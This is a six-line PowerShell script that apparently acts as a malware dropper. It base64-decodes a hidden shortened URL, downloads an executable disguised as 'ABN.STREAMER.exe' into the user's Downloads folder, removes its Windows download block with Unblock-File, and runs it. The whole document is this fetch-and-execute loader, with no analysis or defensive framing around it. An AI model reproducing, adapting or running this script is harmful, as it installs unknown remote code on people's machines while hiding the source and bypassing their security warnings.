$e = 'aHR0cHM6Ly9pcy5nZC81b0pTNjE='
$u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e))
$p = Join-Path $env:USERPROFILE 'Downloads\ABN.STREAMER.exe'
iwr -Uri $u -OutFile $p -UseBasicParsing
Unblock-File $p
Start-Process -FilePath $p
